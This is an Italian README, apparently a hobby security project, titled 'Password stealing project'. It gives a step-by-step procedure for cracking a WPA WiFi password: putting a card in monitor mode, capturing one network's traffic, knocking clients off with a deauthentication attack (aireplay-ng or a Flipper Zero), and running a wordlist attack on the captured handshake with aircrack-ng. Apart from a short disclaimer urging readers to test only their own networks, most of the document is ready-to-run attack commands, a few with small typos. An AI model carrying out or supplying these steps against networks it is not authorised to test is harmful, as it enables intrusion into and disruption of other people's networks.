# Password stealing project

Il nostro progetto è stato quello di evidenziare le vulnerabilità di una rete wifi comune a 2.4GHz. Questo progetto nasce solo ed esclusivamente a scopo informativo e vi invitiamo a replicare il progetto con reti create da voi per verificarne le vulnerabilità.

## Listening wifi

Per iniziare ci servirà un OS Linux con scaricato il tool [Aircrack-ng](https://www.aircrack-ng.org/). Possibilmente usate come distro Kali in quanto preinstallato.
Iniziamo aprendo un terminale e seguendo i seguenti comandi: <br>
```bash
┌(root💀kali)-[~]
│
┕$ iwconfig
```
<p align="center">
  <img src="https://cdn.discordapp.com/attachments/894962833773711380/1205236414799806484/1.png?ex=65d7a2e1&is=65c52de1&hm=efddbf203bfb5a72ed726fb09f1d7ef179bfdfb0abc165da05397ee78f9615e9&">
</p>
Una volta eseguito il comando ci usciranno tutte le schede internet che possediamo sulla macchina. Per iniziare creiamo una scheda parallela virtuale per iniziare il listening delle reti: <br>

```bash
root💀kali:~# sudo airomon-ng start wlan
```
<p align="center">
  <img src="https://cdn.discordapp.com/attachments/894962833773711380/1205236418083815434/2.png?ex=65d7a2e2&is=65c52de2&hm=bc9a2b588cddc145579de3a42ba85e83914b73f1a3f8b34bc8c5afdd0662ee75&">
</p>
Successivamente per visualizzare tutte le reti disponibili: <br>

```bash
root💀kali:~# sudo airodump-ng wlan0mon
```
<br>
<p align="center">
  <img src="https://cdn.discordapp.com/attachments/894962833773711380/1205236418327089172/4.png?ex=65d7a2e2&is=65c52de2&hm=f3a07c39e30e47b8ff61a4d6462ff30ecdab02777c04ae4f9481e96146d5263f&">
</p>
Tra i risultati dobbiamo copiare il BSSID della rete in questione ed eseguire il comando:

```bash
root💀kali:~# airodump-ng -canale -w NomeFile -d BSSID wlan0mon
```
In questo modo stiamo verificando solo la rete in questione.
## Deauth attack
Una volta che siamo in listening wifi possiamo procedere con il [Deauth Attack](https://en.wikipedia.org/wiki/Wi-Fi_deauthentication_attack) (Oggi useremo il Flipper Zero ma ci sono altre alternative come ESP32 Marauder ecc...).
Iniziamo facendo una scansione delle reti, selezioniamo la rete in questione e iniziamo l'attacco.
<p align="center">
  <img src="https://cdn.discordapp.com/attachments/894962833773711380/1205237572805201940/IMG_20240208_204300.jpg?ex=65d7a3f5&is=65c52ef5&hm=c392c425e720c22d01c86162d3928e617a214758450acf1ded75b676056fdc25&">
</p>
Attacco deauth integrato <br>

```bash
root💀kali:~# sudo aireplay-ng --deauth 0 -a BSSID -c STATION wlan0mon
```
<p align="center">
  <img src="https://cdn.discordapp.com/attachments/894962833773711380/1205236418616627231/5.png?ex=65d7a2e2&is=65c52de2&hm=f9644f3e6bb8f83eaf5c1015c61aa207a690676337c5b10d5e45bde5d71091d4&">
</p>
## WPA handshake decrypt
Una volta effettuato l'attacco sul terminale linux dovremo trovare un WPA handshake. Se non compare continuiamo l'attacco in modo che il dispositivo si ricolleghi. Una volta trovato il WPA handshake nella cartella locale troveremo dei file "NomeFile" che contengono tutte le informazioni che ci servono sulla rete. Per eseguire la decriptazione della password del wifi necessitiamo di un file che contenga molte password da provare sul file criptato. Per iniziare la decriptazione: <br>

```bash
root💀kali:~# sudo aircrack-ng NomeFile-01.cap -w Password.txt 
```
<p align="center">
  <img src="https://cdn.discordapp.com/attachments/894962833773711380/1205236418977472573/6.png?ex=65d7a2e2&is=65c52de2&hm=c6b58fe3c05a4b49fa33d9e3d85432edd2f321823269aa00fefa3232dc6756d0&">
</p>
Il tempo di decriptazione può variare in base alla difficoltà della password.

## Tools
[Flipper Zero](https://flipperzero.one/) accoppiato con [ESP32](https://en.wikipedia.org/wiki/ESP32). <br>
Deauther più economico [Marauder](https://github.com/justcallmekoko/ESP32Marauder) sempre con base ESP32. <br>
Tool usato per condividere lo schermo in rete locale [Live-ScreenShare](https://github.com/callmenoway/Live-ScreenShare)
